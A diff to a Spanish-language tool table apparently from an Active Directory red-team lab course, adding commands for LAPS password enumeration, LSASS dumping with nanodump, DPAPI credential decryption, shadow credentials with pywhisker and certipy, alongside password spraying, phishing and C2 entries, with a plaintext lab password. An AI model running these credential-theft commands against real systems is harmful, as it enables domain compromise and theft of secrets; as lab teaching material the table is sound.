@@ -123,9 +123,13 @@
 
 | Lab | Herramienta | Técnica | Instalación |
 |-----|-------------|---------|-------------|
-| Lab-07 | `LAPSToolkit` | LAPS passwords | `Import-Module LAPSToolkit.ps1` |
-| Lab-07 | `nanodump` | LSASS dump sin Mimikatz | `nanodump --write /tmp/lsass.dmp` |
-| Lab-07 | `SharpDPAPI` | DPAPI Master Key dump | `SharpDPAPI.exe masterkeys /rpc` |
+| Lab-07 | `nxc` | LAPS enum via LDAP | `nxc ldap 10.0.2.10 -u helpdesk.ruiz -p 'Helpdesk2024!' -M laps` |
+| Lab-07 | `LAPSToolkit` | LAPS passwords (legacy) | `Import-Module LAPSToolkit.ps1; Get-LAPSComputers` |
+| Lab-07 | `Get-LapsADPassword` | Windows LAPS nativo | `Get-LapsADPassword -Identity WKSTN-01 -AsPlainText` |
+| Lab-07 | `SharpDPAPI` | DPAPI Credential Manager | `SharpDPAPI.exe credentials /unprotect` |
+| Lab-07 | `nanodump` | LSASS dump sin Mimikatz | `nanodump --write /tmp/lsass.dmp --valid` |
+| Lab-07 | `pywhisker` | Shadow Credentials | `pywhisker.py -d dom -u helpdesk.ruiz -p pass --target WKSTN-01 --action add` |
+| Lab-07 | `certipy` | PKINIT auth via Shadow Creds | `certipy auth -pfx cert.pfx -dc-ip 10.0.2.10` |
 | Lab-08 | `Kerbrute` | Password spraying | `kerbrute passwordspray -d dom users.txt pass` |
 | Lab-09 | `GoPhish` | Phishing campaigns | Panel web en Kali |
 | Lab-10 | `Havoc C2` | C2 avanzado con BOFs | Compilar desde GitHub |
